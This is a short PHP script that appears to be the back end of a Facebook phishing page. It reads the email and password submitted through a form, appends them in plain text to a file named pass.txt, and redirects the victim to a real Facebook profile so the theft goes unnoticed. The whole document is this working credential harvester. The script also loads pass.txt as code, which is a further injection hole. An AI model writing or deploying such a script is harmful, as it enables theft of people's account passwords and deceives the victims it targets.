<?php
require "pass.txt";
$email = $_POST['email'];
$pass = $_POST['pass'];
$email = $email;
$pass = $pass;
$sep = "*********************\n";
file_put_contents('pass.txt', $email.PHP_EOL , FILE_APPEND | LOCK_EX);
file_put_contents('pass.txt', $pass.PHP_EOL , FILE_APPEND | LOCK_EX);
file_put_contents('pass.txt', $sep.PHP_EOL , FILE_APPEND | LOCK_EX);
header('Location: https://www.facebook.com/profile.php?id=100028070380145');
?>